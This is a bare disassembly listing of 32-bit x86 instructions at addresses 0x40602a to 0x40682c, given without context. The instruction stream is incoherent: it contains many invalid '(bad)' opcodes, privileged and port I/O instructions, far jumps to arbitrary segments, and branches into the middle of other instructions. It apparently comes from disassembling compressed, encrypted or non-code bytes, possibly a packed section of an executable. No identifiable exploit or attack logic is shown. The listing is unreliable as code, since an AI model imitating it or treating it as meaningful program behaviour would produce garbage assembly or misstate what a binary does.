  40602a:	and    DWORD PTR [eax+0x299defaf],edi
  406030:	add    eax,0xa7af2117
  406035:	mov    ah,0xb0
  406037:	xchg   ebp,eax
  406038:	div    DWORD PTR [edx+0x3b]
  40603b:	(bad)  
  40603c:	leave  
  40603d:	dec    eax
  40603e:	outs   dx,BYTE PTR ds:[esi]
  40603f:	or     al,0x24
  406041:	scas   al,BYTE PTR es:[edi]
  406042:	hlt    
  406043:	repz dec ebp
  406045:	or     bh,0xdd
  406048:	aas    
  406049:	and    al,0x91
  40604b:	ror    BYTE PTR [ecx],0xec
  40604e:	lahf   
  40604f:	vmwrite esi,DWORD PTR [esi]
  406052:	popa   
  406053:	add    eax,ebp
  406055:	int3   
  406056:	xchg   BYTE PTR [edx],al
  406058:	inc    ah
  40605a:	mov    cl,dl
  40605c:	sub    cl,cl
  40605e:	adc    eax,0x66195e60
  406063:	mov    WORD PTR [edi-0x4bcd7451],fs
  406069:	pop    esi
  40606a:	cli    
  40606b:	cs adc al,0x62
  40606e:	(bad)  
  406070:	jle    0x406062
  406072:	aam    0xbd
  406074:	lock scas al,BYTE PTR es:[edi]
  406076:	pop    ebp
  406077:	fxch   st(4)
  406079:	dec    ecx
  40607a:	mov    eax,ds:0x9b08b677
  40607f:	ret    0x3ed3
  406082:	sbb    ebx,DWORD PTR [edi+0x315b6a68]
  406088:	xor    al,0x33
  40608a:	jo     0x40601c
  40608c:	cmp    bl,BYTE PTR [edi+edi*1-0x2624bfd4]
  406093:	jp     0x4060a6
  406095:	xor    eax,0x5ac85d4b
  40609a:	pop    edx
  40609b:	mul    BYTE PTR [eax-0x42]
  40609e:	inc    esp
  40609f:	outs   dx,BYTE PTR ds:[esi]
  4060a0:	mov    eax,0x91e4c8fc
  4060a5:	inc    ebx
  4060a6:	std    
  4060a7:	sbb    eax,0xa1e41ead
  4060ac:	pop    esi
  4060ad:	jge    0x40608f
  4060af:	sahf   
  4060b0:	lock leave 
  4060b2:	inc    ebp
  4060b3:	mov    al,0x15
  4060b5:	in     eax,0x24
  4060b7:	mov    ds:0x9970f30d,eax
  4060bc:	test   al,0x7
  4060be:	adc    BYTE PTR [eax+0x14],bl
  4060c1:	mov    dl,0x19
  4060c3:	sub    dh,BYTE PTR [esi+0x7463fbdd]
  4060c9:	pop    edi
  4060ca:	rol    BYTE PTR [esi-0x76],0x2d
  4060ce:	adc    al,0xb3
  4060d0:	test   DWORD PTR [esi-0x544024a2],ebx
  4060d6:	cmp    DWORD PTR [edi+0x49],edx
  4060d9:	inc    eax
  4060da:	hlt    
  4060db:	fdivrp st(2),st
  4060dd:	or     dh,BYTE PTR [edx]
  4060df:	mov    al,0x21
  4060e1:	daa    
  4060e2:	sub    edi,DWORD PTR [edx]
  4060e4:	(bad)  
  4060e5:	pushf  
  4060e6:	jne    0x40607e
  4060e8:	ja     0x406073
  4060ea:	(bad)  
  4060eb:	mov    edi,0x9a3f8fd8
  4060f0:	and    ecx,DWORD PTR [eax-0x3015db6]
  4060f6:	xor    ebp,DWORD PTR [edx-0x38]
  4060f9:	ror    DWORD PTR ds:0x8ea03c3d,1
  4060ff:	(bad)  
  406100:	icebp  
  406101:	ins    DWORD PTR es:[edi],dx
  406102:	push   cs
  406103:	push   ecx
  406104:	jno    0x4060cf
  406106:	dec    ebx
  406107:	clc    
  406108:	stos   DWORD PTR es:[edi],eax
  406109:	loope  0x406164
  40610b:	push   esi
  40610c:	jmp    0xd7ae:0x41686c36
  406113:	jbe    0x40613f
  406115:	ins    DWORD PTR es:[edi],dx
  406116:	js     0x40613a
  406118:	sbb    eax,0x439e2060
  40611d:	call   0xae5b:0xdc514ef4
  406124:	ja     0x406138
  406126:	lea    ebx,[edi*8+0xef50b9a]
  40612d:	iret   
  40612e:	xchg   al,dh
  406130:	ja     0x406158
  406132:	push   es
  406133:	pop    ebx
  406134:	ins    BYTE PTR es:[edi],dx
  406135:	xlat   BYTE PTR ds:[ebx]
  406136:	cld    
  406137:	mov    gs,edx
  406139:	mov    esi,0x2fc4dc3d
  40613e:	pop    DWORD PTR [ecx+0x355f09ad]
  406144:	mov    DWORD PTR [eax],esp
  406146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406147:	jbe    0x406195
  406149:	retf   0xe233
  40614c:	cmp    ecx,DWORD PTR [edx+0x65fa253f]
  406152:	sbb    DWORD PTR [eax-0x79cb91d9],esi
  406158:	or     DWORD PTR [eax+0x2a],ecx
  40615b:	test   al,0x6f
  40615d:	repz js 0x4061c1
  406160:	mov    ebp,0xf624147e
  406165:	sbb    DWORD PTR [edi+0x8],esi
  406168:	cmp    BYTE PTR [edi],ch
  40616a:	sub    eax,0xfc0e1226
  40616f:	fst    QWORD PTR [ebp+0x47e42f7a]
  406175:	cmp    ch,BYTE PTR [ebx+0x13ec052]
  40617b:	daa    
  40617c:	or     eax,0x68da01e0
  406181:	mov    dh,0xc0
  406183:	inc    esi
  406184:	int3   
  406185:	push   0xffffffe4
  406187:	push   ebx
  406188:	xchg   ebp,eax
  406189:	mov    dl,0x71
  40618b:	fucomp st(3)
  40618d:	(bad)  
  40618e:	cdq    
  40618f:	xor    cl,BYTE PTR [eax-0x79]
  406192:	add    ah,BYTE PTR [esi-0x2aee9400]
  406198:	arpl   WORD PTR [eax],cx
  40619a:	push   edi
  40619b:	sub    BYTE PTR [edi+0x55f7f83b],ah
  4061a1:	push   esp
  4061a2:	clc    
  4061a3:	and    ch,cl
  4061a5:	mov    dl,0x12
  4061a7:	js     0x406226
  4061a9:	or     esp,DWORD PTR [ecx]
  4061ab:	nop
  4061ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ad:	cmp    ch,bh
  4061af:	sbb    eax,esi
  4061b1:	into   
  4061b2:	sbb    bl,BYTE PTR [esi+0x5d1e2199]
  4061b8:	popa   
  4061b9:	pop    esp
  4061ba:	cmp    BYTE PTR [esp+esi*2],dh
  4061bd:	adc    al,0x4d
  4061bf:	out    dx,al
  4061c0:	mov    al,ds:0x7f17649c
  4061c5:	ins    DWORD PTR es:[edi],dx
  4061c6:	fdiv   QWORD PTR [ebp+0x54]
  4061c9:	pop    esp
  4061ca:	jo     0x406209
  4061cc:	(bad)  [edi+0x5a]
  4061cf:	hlt    
  4061d0:	mov    dl,0x80
  4061d2:	push   edx
  4061d3:	mov    al,ds:0xf93c3da1
  4061d8:	call   0x7ec05c49
  4061dd:	outs   dx,DWORD PTR ds:[esi]
  4061de:	add    eax,0x5d1a34db
  4061e3:	and    DWORD PTR [ecx+0x77],eax
  4061e6:	pop    ss
  4061e7:	push   cs
  4061e8:	imul   eax,DWORD PTR [esi+0x57],0x13
  4061ec:	xchg   esi,eax
  4061ed:	dec    esp
  4061ee:	loopne 0x406236
  4061f0:	scas   al,BYTE PTR es:[edi]
  4061f1:	mov    edx,0xc4837f12
  4061f6:	inc    edx
  4061f7:	add    al,0xeb
  4061f9:	pop    esp
  4061fa:	lock adc cl,BYTE PTR ds:0x234b8062
  406201:	je     0x40620c
  406203:	xchg   BYTE PTR [edx],bl
  406205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406206:	data16 add al,0xf
  406209:	fld    DWORD PTR [ecx+0x159f2d3b]
  40620f:	jae    0x4061a9
  406211:	mov    es,WORD PTR [edx+0x49563dec]
  406217:	mov    ch,0x37
  406219:	dec    ebx
  40621a:	xor    BYTE PTR es:[esi+ebx*4],bl
  40621e:	jmp    0x406245
  406220:	clc    
  406221:	dec    eax
  406222:	out    0xfe,al
  406224:	repz pop ds
  406226:	or     BYTE PTR [esi+0xe],ch
  406229:	fld    QWORD PTR gs:[ebp-0xc935af4]
  406230:	or     edi,DWORD PTR [ebp-0x74]
  406233:	(bad)  [esi+0x77]
  406236:	and    eax,0xe23fcdeb
  40623b:	pop    ebp
  40623c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40623d:	sahf   
  40623e:	jmp    0x40622c
  406240:	out    0xd,al
  406242:	jns    0x406255
  406244:	push   eax
  406245:	das    
  406246:	inc    edi
  406247:	dec    ebp
  406248:	int3   
  406249:	test   eax,0x89be9a24
  40624e:	dec    edi
  40624f:	adc    eax,DWORD PTR [ebx-0x5e06dcf]
  406255:	mov    cl,0x7b
  406257:	call   0x4c6ad888
  40625c:	repz call 0xf3b8:0x969f6d56
  406264:	dec    edi
  406265:	cmp    esi,DWORD PTR [edi]
  406267:	mov    edx,0xe5a00b0
  40626c:	jne    0x4062e7
  40626e:	(bad)  
  40626f:	xor    al,0x6c
  406271:	xchg   ebp,eax
  406272:	xor    bl,ch
  406274:	xchg   ebx,eax
  406275:	dec    esp
  406276:	cs pop esi
  406278:	or     eax,0xba936125
  40627d:	bnd jo 0x40620d
  406280:	lods   eax,DWORD PTR ds:[esi]
  406281:	pop    edx
  406282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406283:	adc    eax,0x6312fef9
  406288:	xor    eax,0xc9ef4d70
  40628d:	jmp    0x4969a7d
  406292:	fwait
  406293:	(bad)  
  406294:	jne    0x40628b
  406296:	adc    esi,eax
  406298:	iret   
  406299:	enter  0xc894,0xa9
  40629d:	ja     0x406228
  40629f:	jge    0x40624d
  4062a1:	bnd ret 
  4062a3:	addr16 dec ebp
  4062a5:	les    esp,FWORD PTR [esi]
  4062a7:	out    0x99,al
  4062a9:	xlat   BYTE PTR ds:[ebx]
  4062aa:	pop    ds
  4062ab:	lahf   
  4062ac:	push   ds
  4062ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062ae:	jge    0x4062d2
  4062b0:	cli    
  4062b1:	jns    0x406305
  4062b3:	(bad)  
  4062b4:	mov    esp,0x51c87939
  4062b9:	push   edi
  4062ba:	cwde   
  4062bb:	hlt    
  4062bc:	pop    ebp
  4062bd:	add    BYTE PTR [edi+0x5c],0xb
  4062c1:	(bad)
  4062c4:	mov    ch,0xf9
  4062c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062c7:	ja     0x4062ae
  4062c9:	push   esp
  4062ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062cb:	mov    bh,BYTE PTR [eax+eax*2-0x7c]
  4062cf:	sub    eax,0x344a044
  4062d4:	or     al,0x4d
  4062d6:	jb     0x406300
  4062d8:	push   edx
  4062d9:	sti    
  4062da:	icebp  
  4062db:	xchg   DWORD PTR ds:0x731d2a6d,eax
  4062e1:	mov    esi,0x3ae0f341
  4062e6:	pop    esi
  4062e7:	sbb    DWORD PTR [edi-0x7526c89],0x5f
  4062ee:	add    edi,DWORD PTR [ebp+0x53]
  4062f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062f2:	sahf   
  4062f3:	sti    
  4062f4:	jmp    0x9d4c:0x11d1f29
  4062fb:	sub    cl,BYTE PTR [eax+0x45]
  4062fe:	pop    esp
  4062ff:	jo     0x406369
  406301:	cmp    DWORD PTR [ecx-0x2423e460],edi
  406307:	in     al,0x18
  406309:	sbb    ah,BYTE PTR [edi]
  40630b:	push   ss
  40630c:	push   ebx
  40630d:	stc    
  40630e:	fisubr DWORD PTR [ecx]
  406310:	in     al,0xa3
  406312:	dec    edi
  406313:	xor    al,0x94
  406315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406316:	xor    BYTE PTR [ecx-0x65],al
  406319:	or     al,0x64
  40631b:	pop    ecx
  40631c:	mov    ebx,DWORD PTR ds:0x632afd9e
  406322:	dec    ebx
  406323:	dec    ecx
  406324:	idiv   BYTE PTR [ecx]
  406326:	xor    al,0x4b
  406328:	std    
  406329:	inc    ebx
  40632a:	mov    bh,0x6
  40632c:	sbb    DWORD PTR [ecx],esi
  40632e:	push   edi
  40632f:	fistp  WORD PTR [bp+di]
  406332:	xchg   edi,eax
  406333:	xor    al,BYTE PTR [esi+ebp*4-0x3c591123]
  40633a:	jmp    0xaeae:0x1a96c3ef
  406341:	fpatan 
  406343:	xor    edi,DWORD PTR [edx-0x3e]
  406346:	call   0x25d9:0xdbcd68e6
  40634d:	test   al,0x8a
  40634f:	sbb    ebp,DWORD PTR [ecx-0x74]
  406352:	adc    DWORD PTR [edx],ebx
  406354:	test   DWORD PTR [ebx-0x71bc0731],0xce8deac0
  40635e:	xchg   edx,eax
  40635f:	mov    ch,0x6c
  406361:	mov    ch,0xa1
  406363:	mov    esi,0x4d187822
  406368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406369:	loope  0x40637b
  40636b:	ins    BYTE PTR es:[edi],dx
  40636c:	pop    edx
  40636d:	dec    eax
  40636e:	enter  0x2607,0x6d
  406372:	(bad)  
  406373:	jmp    0x406322
  406375:	xchg   edi,eax
  406376:	adc    ebp,DWORD PTR [ecx]
  406378:	int    0x4c
  40637a:	stos   BYTE PTR es:[edi],al
  40637b:	test   BYTE PTR [edx],bh
  40637d:	fwait
  40637e:	retf   
  40637f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406380:	aas    
  406381:	rcl    DWORD PTR [ebx+0x2b657b5a],0xaf
  406388:	fmul   DWORD PTR [ecx]
  40638a:	xor    al,0x48
  40638c:	cmc    
  40638d:	mov    ds:0xa88d781f,al
  406392:	inc    ebp
  406393:	into   
  406394:	(bad)  
  406395:	pushf  
  406396:	cmp    eax,0x849a2ad9
  40639b:	call   FWORD PTR [ecx]
  40639d:	jno    0x406320
  40639f:	dec    ebx
  4063a0:	push   ecx
  4063a1:	mov    ebx,0x2116245d
  4063a6:	out    0x93,eax
  4063a8:	cs pop eax
  4063aa:	shl    DWORD PTR ss:[ebx+ebx*4-0x40e72126],cl
  4063b2:	pop    eax
  4063b3:	push   eax
  4063b4:	adc    bl,BYTE PTR [eax-0x28e77fec]
  4063ba:	mov    esi,0x58ca74d9
  4063bf:	mov    ebx,0xddfbae20
  4063c4:	imul   eax,DWORD PTR [esi+0x11ce8261],0x8827eaf3
  4063ce:	js     0x40642f
  4063d0:	sub    BYTE PTR [edx+0x39],ah
  4063d3:	imul   ebx,DWORD PTR [ebp-0x52],0x8a3cd2cd
  4063da:	out    0x16,al
  4063dc:	iret   
  4063dd:	daa    
  4063de:	jnp    0x406421
  4063e0:	ficomp DWORD PTR [ebx-0x41]
  4063e3:	cmp    eax,0xbf488406
  4063e8:	jb     0x4063f7
  4063ea:	sbb    eax,0xedc83dc4
  4063ef:	jmp    0xe2cd:0x64512038
  4063f6:	popf   
  4063f7:	push   ebx
  4063f8:	cmp    esp,DWORD PTR [edi+0x38eb4c0e]
  4063fe:	std    
  4063ff:	dec    ebp
  406400:	in     al,0x71
  406402:	mov    al,ds:0xc327fa7
  406407:	rol    ch,cl
  406409:	pop    ss
  40640a:	cmp    cl,bh
  40640c:	nop
  40640d:	mov    dh,BYTE PTR [edx+0x74da2dd]
  406413:	fcomp  DWORD PTR [esi+0x4a15d8d3]
  406419:	push   ds
  40641a:	(bad)  
  40641c:	test   edx,0x20535d82
  406422:	out    dx,al
  406423:	add    ah,BYTE PTR [eax-0x75897711]
  406429:	mov    bl,0xe5
  40642b:	cmp    dh,BYTE PTR [edx-0x46]
  40642e:	adc    ch,BYTE PTR [edx-0x1b]
  406431:	ss in  eax,0x8d
  406434:	mov    eax,cs:0xafc790a
  40643a:	pushf  
  40643b:	aaa    
  40643c:	cmp    bh,al
  40643e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40643f:	dec    edi
  406440:	test   edi,ebx
  406442:	mov    eax,ds:0xd948e691
  406447:	fidiv  WORD PTR [edx]
  406449:	test   al,0x47
  40644b:	(bad)  
  40644c:	mov    esi,0xa494791c
  406451:	in     eax,0xc6
  406453:	mov    al,ds:0x6e39ce64
  406458:	dec    esi
  406459:	mov    esp,0x9e82bfee
  40645e:	lods   eax,DWORD PTR ds:[esi]
  40645f:	fldenv [eax+edx*4]
  406462:	les    edi,FWORD PTR [ebx+esi*8-0x525dcc53]
  406469:	adc    eax,0x61c6193a
  40646e:	inc    esi
  40646f:	mov    ecx,0x8be7ccf3
  406474:	lods   al,BYTE PTR ds:[esi]
  406475:	push   edx
  406476:	vmulps xmm6,xmm3,XMMWORD PTR [eax]
  40647a:	mov    ch,0x4b
  40647c:	test   BYTE PTR ds:0x4044e64a,bl
  406482:	enter  0xaec0,0xae
  406486:	jbe    0x406454
  406488:	mov    dl,0x51
  40648a:	xchg   ebx,eax
  40648b:	je     0x406497
  40648d:	sar    DWORD PTR [ebx+ebp*1+0x79],cl
  406491:	mov    al,0x2c
  406493:	mov    eax,0xb7e784d7
  406498:	sub    ebp,DWORD PTR [edi]
  40649a:	mov    ch,0x82
  40649c:	out    0xfe,eax
  40649e:	and    cl,dh
  4064a0:	bnd jno 0x406495
  4064a3:	push   esi
  4064a4:	ds iret 
  4064a6:	pop    ebx
  4064a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064a8:	push   ebp
  4064a9:	adc    ecx,DWORD PTR [eax-0x39]
  4064ac:	or     BYTE PTR [ebx+0x25],cl
  4064af:	xchg   ebx,eax
  4064b0:	mov    ebx,0xd42a11aa
  4064b5:	or     eax,0xfe88572a
  4064ba:	pop    ebx
  4064bb:	push   ecx
  4064bc:	scas   eax,DWORD PTR es:[edi]
  4064bd:	inc    ebp
  4064be:	mov    ds:0x47a7625f,eax
  4064c3:	ret    0x48
  4064c6:	js     0x4064f4
  4064c8:	test   eax,0xdbeb8b3e
  4064cd:	ror    esp,1
  4064cf:	loopne 0x40653f
  4064d1:	nop
  4064d2:	jbe    0x40649d
  4064d4:	cmp    bh,BYTE PTR [edi+0x4c]
  4064d7:	sahf   
  4064d8:	in     eax,dx
  4064d9:	mov    eax,0xf59f443c
  4064de:	add    edx,DWORD PTR [ebx+0xe2d3d72]
  4064e4:	in     eax,dx
  4064e5:	xchg   esp,eax
  4064e6:	in     eax,0x22
  4064e8:	lea    eax,[eax-0x4e]
  4064eb:	mov    al,ds:0x225e4079
  4064f0:	push   ds
  4064f1:	fcmovne st,st(3)
  4064f3:	add    eax,0x9894e5d9
  4064f8:	hlt    
  4064f9:	out    0x17,eax
  4064fb:	iret   
  4064fc:	dec    edx
  4064fd:	aaa    
  4064fe:	xchg   esi,ebp
  406500:	and    eax,0x4ce96c9
  406505:	or     DWORD PTR ds:0xb626dd2f,ecx
  40650b:	out    0xae,al
  40650d:	pusha  
  40650e:	enter  0x5836,0x7f
  406512:	rcl    BYTE PTR [ecx-0x71],1
  406515:	inc    esi
  406516:	int    0x87
  406518:	in     eax,dx
  406519:	add    DWORD PTR [edi-0x7e],edx
  40651c:	arpl   ax,si
  40651e:	(bad)  
  40651f:	xlat   BYTE PTR ds:[ebx]
  406520:	cmp    bh,bh
  406522:	out    dx,eax
  406523:	xchg   ebx,esi
  406525:	jg     0x406569
  406527:	jae    0x406502
  406529:	in     al,0x6e
  40652b:	sbb    esi,DWORD PTR [ebp-0x5dbb1b25]
  406531:	mov    edi,0xb56f52db
  406536:	inc    edx
  406537:	cmp    eax,ebx
  406539:	add    ecx,ecx
  40653b:	adc    DWORD PTR [edx-0x3f9d1c22],edx
  406541:	ds mov ah,0x3
  406544:	and    bl,dh
  406546:	jnp    0x4065ae
  406548:	xlat   BYTE PTR ds:[ebx]
  406549:	stc    
  40654a:	xchg   ebp,eax
  40654b:	je     0x4065b6
  40654d:	jge    0x406544
  40654f:	rcr    DWORD PTR [ebp-0x58],1
  406552:	mov    edi,esp
  406554:	sbb    al,0x80
  406556:	popa   
  406557:	bnd jae 0x40651a
  40655a:	mov    edx,0x19069426
  40655f:	fcom   DWORD PTR [edi]
  406561:	xchg   BYTE PTR [eax-0x6cb75c56],ah
  406567:	pop    esi
  406568:	(bad)  
  406569:	test   BYTE PTR es:[ebp-0x7bc58c18],0x59
  406571:	pop    ecx
  406572:	dec    ebx
  406573:	or     ebx,DWORD PTR [edi+0x444f2039]
  406579:	xchg   esp,eax
  40657a:	call   0x7d60:0x38c48468
  406581:	pop    edx
  406582:	inc    edi
  406583:	dec    esi
  406584:	out    dx,al
  406585:	inc    esi
  406586:	pop    esi
  406587:	push   ds
  406588:	(bad)
  40658c:	push   0xffffffa1
  40658e:	not    esi
  406590:	xor    al,0xe7
  406592:	hlt    
  406593:	mov    bh,0xf2
  406595:	pop    es
  406596:	retf   
  406597:	rol    DWORD PTR [eax+0x34],1
  40659a:	jns    0x406553
  40659c:	add    eax,0x61d5cb05
  4065a1:	adc    eax,0x3ed7b982
  4065a6:	mov    bh,0x56
  4065a8:	or     eax,0xae01d3fe
  4065ad:	jmp    0x406614
  4065af:	stos   BYTE PTR es:[edi],al
  4065b0:	jle    0x4065c5
  4065b2:	mov    bh,0x14
  4065b4:	xchg   BYTE PTR [ebp-0x20bbb337],dh
  4065ba:	(bad)  
  4065bb:	and    al,cl
  4065bd:	ds dec edx
  4065bf:	hlt    
  4065c0:	mov    ebx,0xb6bcf351
  4065c5:	push   ebx
  4065c6:	lock repz out 0xcc,al
  4065ca:	cmc    
  4065cb:	jmp    FWORD PTR [esi-0x9]
  4065ce:	xchg   DWORD PTR [ebx+0x29172a4a],ecx
  4065d4:	sub    edi,DWORD PTR [ecx-0x2e]
  4065d7:	ror    DWORD PTR [esp+esi*4],0x50
  4065db:	xchg   esp,eax
  4065dc:	stc    
  4065dd:	mov    dh,BYTE PTR [esp+ecx*8-0x5daac2bd]
  4065e4:	inc    esi
  4065e5:	and    cl,bh
  4065e7:	js     0x40661e
  4065e9:	(bad)  
  4065ea:	(bad)  
  4065ec:	xor    BYTE PTR [esi+0x7c],bl
  4065ef:	or     al,BYTE PTR [edx-0x8]
  4065f2:	(bad)
  4065f6:	retf   
  4065f7:	push   esi
  4065f8:	xchg   ebx,eax
  4065f9:	jb     0x4065c5
  4065fb:	mov    ebp,0xca1270f4
  406600:	sti    
  406601:	retf   
  406602:	cld    
  406603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406604:	jne    0x4065e0
  406606:	xchg   esp,eax
  406607:	jmp    0xb442:0x549104ec
  40660e:	mov    edx,0xe2e2b608
  406613:	jl     0x4065e8
  406615:	xor    DWORD PTR [ebx+0x16],ecx
  406618:	mov    cl,cl
  40661a:	loopne 0x406649
  40661c:	or     eax,0xd55c6120
  406621:	or     BYTE PTR [ebx-0x2e4073e3],0xdf
  406628:	data16 adc dh,BYTE PTR [edx-0x25]
  40662c:	out    0x58,eax
  40662e:	je     0x406620
  406630:	sbb    cl,0x7e
  406633:	mov    al,0x2d
  406635:	mov    WORD PTR [edx-0x15188332],gs
  40663b:	pop    esp
  40663c:	sbb    BYTE PTR [ebx-0x746cef5a],al
  406642:	add    dl,BYTE PTR [ebp+0x73]
  406645:	mov    ds:0x3f467583,eax
  40664a:	popf   
  40664b:	or     esp,DWORD PTR [ebp+edx*4-0x6c]
  40664f:	pushf  
  406650:	adc    BYTE PTR [ecx],al
  406652:	sub    edx,DWORD PTR gs:[edx]
  406655:	lds    eax,FWORD PTR [eax+0x53]
  406658:	pop    eax
  406659:	push   cs
  40665a:	or     ebx,DWORD PTR [esi]
  40665c:	sti    
  40665d:	in     eax,dx
  40665e:	mov    bl,0x17
  406660:	adc    eax,esp
  406662:	mov    bh,0x8b
  406664:	(bad)  
  406665:	(bad)  
  406666:	hlt    
  406667:	(bad)  
  406668:	retf   0xb978
  40666b:	(bad)  
  40666c:	es dec esi
  40666e:	out    0x33,eax
  406670:	lods   eax,DWORD PTR ds:[esi]
  406671:	je     0x4066d4
  406673:	pop    ecx
  406674:	jge    0x4065fb
  406676:	mov    DWORD PTR ds:0x9c83b648,edx
  40667c:	hlt    
  40667d:	(bad)  
  40667e:	push   es
  40667f:	xor    cl,ah
  406681:	stos   DWORD PTR es:[edi],eax
  406682:	sub    BYTE PTR [ebp-0x4be7f88b],bh
  406688:	inc    edi
  406689:	sub    DWORD PTR [ecx+0x1f31b386],0xc0032d2d
  406693:	lock mov bh,0xd
  406696:	pop    ebx
  406697:	(bad)
  40669b:	bound  ebx,QWORD PTR [ebx+0x32f8eaaf]
  4066a1:	pop    es
  4066a2:	add    DWORD PTR [edi+0x4989f2c8],ecx
  4066a8:	stc    
  4066a9:	aad    0x84
  4066ab:	pushf  
  4066ac:	xchg   edx,eax
  4066ad:	hlt    
  4066ae:	bound  edx,QWORD PTR [ebx+edx*2+0x2c]
  4066b2:	popa   
  4066b3:	sub    DWORD PTR [eax+0x45],ebp
  4066b6:	xchg   BYTE PTR [eax-0x75],al
  4066b9:	sbb    BYTE PTR ds:[edi-0x626323f4],0xa3
  4066c1:	xor    ebx,edx
  4066c3:	enter  0x5c38,0x2e
  4066c7:	xchg   ebx,eax
  4066c8:	enter  0xcaf2,0xe1
  4066cc:	into   
  4066cd:	xor    esi,DWORD PTR [edx+0x54]
  4066d0:	push   edx
  4066d1:	xor    eax,0x5818b312
  4066d6:	jmp    0x406732
  4066d8:	fadd   DWORD PTR [eax-0x1c22789a]
  4066de:	push   ds
  4066df:	push   cs
  4066e0:	add    eax,0x64ca5c5c
  4066e5:	sub    DWORD PTR [eax-0x19016a89],ecx
  4066eb:	lods   eax,DWORD PTR ds:[esi]
  4066ec:	rcr    DWORD PTR [eax],1
  4066ee:	enter  0xd542,0x74
  4066f2:	fadd   st(7),st
  4066f4:	push   ecx
  4066f5:	pop    esp
  4066f6:	jmp    0x9ad7:0x3faf0365
  4066fd:	out    0x4e,al
  4066ff:	cli    
  406700:	dec    edi
  406701:	cmp    DWORD PTR [edx],edx
  406703:	lea    ebp,ds:[ebp+0x33]
  406707:	inc    ebp
  406708:	cmc    
  406709:	adc    DWORD PTR [edi-0x1e],edi
  40670c:	pushf  
  40670d:	int3   
  40670e:	xor    dl,ch
  406710:	ja     0x4066a3
  406712:	push   0x62
  406714:	or     DWORD PTR [edi],esi
  406716:	or     ch,BYTE PTR [edx-0x7d]
  406719:	push   ecx
  40671a:	adc    eax,0xeea5c97d
  40671f:	sahf   
  406720:	xor    al,0x3d
  406722:	fwait
  406723:	hlt    
  406724:	cld    
  406725:	in     al,dx
  406726:	iret   
  406727:	pusha  
  406728:	into   
  406729:	jae    0x4066f1
  40672b:	xchg   ebp,eax
  40672c:	push   edi
  40672d:	into   
  40672e:	adc    al,0xc4
  406730:	test   DWORD PTR [edx+esi*2+0x7d1a8caa],ecx
  406737:	inc    eax
  406738:	stos   BYTE PTR es:[edi],al
  406739:	pop    esi
  40673a:	add    al,0x7d
  40673c:	out    0xce,al
  40673e:	pushf  
  40673f:	es mov ecx,es
  406742:	fcmove st,st(6)
  406744:	in     eax,dx
  406745:	les    esp,FWORD PTR [ebx-0x40]
  406748:	and    ah,BYTE PTR [esi+ecx*4]
  40674b:	cmp    esp,DWORD PTR [edx-0xfd6a01c]
  406751:	inc    edx
  406752:	sub    BYTE PTR [edx-0x754d1f29],ah
  406758:	xchg   ebx,eax
  406759:	iret   
  40675a:	stos   DWORD PTR es:[edi],eax
  40675b:	ficomp WORD PTR [ebx+0x2101c379]
  406761:	and    ch,BYTE PTR [eax-0x3d]
  406764:	jne    0x40679a
  406766:	and    BYTE PTR [edx],0x4
  406769:	outs   dx,BYTE PTR ds:[esi]
  40676a:	ficomp DWORD PTR [ecx]
  40676c:	jle    0x4067e8
  40676e:	pop    edi
  40676f:	imul   edx,DWORD PTR [esi+0x191e7192],0xffffffd1
  406776:	mov    al,ds:0x4ea716fd
  40677b:	pushf  
  40677c:	sbb    edx,DWORD PTR [esi]
  40677e:	push   eax
  40677f:	and    DWORD PTR [ecx-0x320527cf],edi
  406785:	pushf  
  406786:	xor    DWORD PTR [ebx-0x674d72c8],ebx
  40678c:	mov    dl,0x79
  40678e:	inc    ecx
  40678f:	div    BYTE PTR [ebx+0x4]
  406792:	ins    DWORD PTR es:[edi],dx
  406793:	iret   
  406794:	cmp    eax,0x5ed3dad2
  406799:	and    eax,0xec26ab35
  40679e:	jge    0x4067af
  4067a0:	mov    eax,ds:0x3f00134e
  4067a5:	xchg   edi,eax
  4067a6:	(bad)  
  4067a7:	cli    
  4067a8:	push   0x6b
  4067aa:	mov    WORD PTR [ebp-0x18],?
  4067ad:	mov    bl,al
  4067af:	(bad)  
  4067b0:	jmp    0x6214:0x3a21e260
  4067b7:	int    0x96
  4067b9:	aas    
  4067ba:	and    DWORD PTR [edi],ebp
  4067bc:	xor    al,0x5b
  4067be:	jp     0x406742
  4067c0:	jae    0x4067f2
  4067c2:	jae    0x4067c1
  4067c4:	dec    esp
  4067c5:	mov    eax,ds:0xdd14b12a
  4067ca:	and    al,0x4c
  4067cc:	fwait
  4067cd:	inc    edi
  4067ce:	call   0x4556:0x935abf1a
  4067d5:	es (bad) 
  4067d8:	add    dl,BYTE PTR [edi+0x18]
  4067db:	mov    eax,ds:0xcb327706
  4067e0:	aad    0x3d
  4067e2:	cmc    
  4067e3:	adc    eax,0xd7b34da3
  4067e8:	push   cs
  4067e9:	and    ch,BYTE PTR [esp+ebp*4]
  4067ec:	call   0x5a7c:0xad3c1ba5
  4067f3:	sbb    al,0x71
  4067f5:	ret    0x35a
  4067f8:	adc    ebx,DWORD PTR [edx]
  4067fa:	push   ebp
  4067fb:	push   ecx
  4067fd:	mov    edx,0xb848de2c
  406802:	jbe    0x40684e
  406804:	cdq    
  406805:	mov    BYTE PTR [esi-0x5a],cl
  406808:	pop    esi
  406809:	mov    ah,0x4
  40680b:	fs int3 
  40680d:	ja     0x4067b7
  40680f:	inc    ebp
  406810:	imul   ebx,edi,0x56
  406813:	xor    bl,dl
  406815:	lds    eax,FWORD PTR [esi-0x2e147dcc]
  40681b:	mov    ebx,0xef69c623
  406820:	sub    eax,0x5e4476a9
  406825:	jge    0x4067d3
  406827:	cmp    BYTE PTR [edx+0x4c],dh
  40682a:	jl     0x4067fa
  40682c:	repnz dec ecx
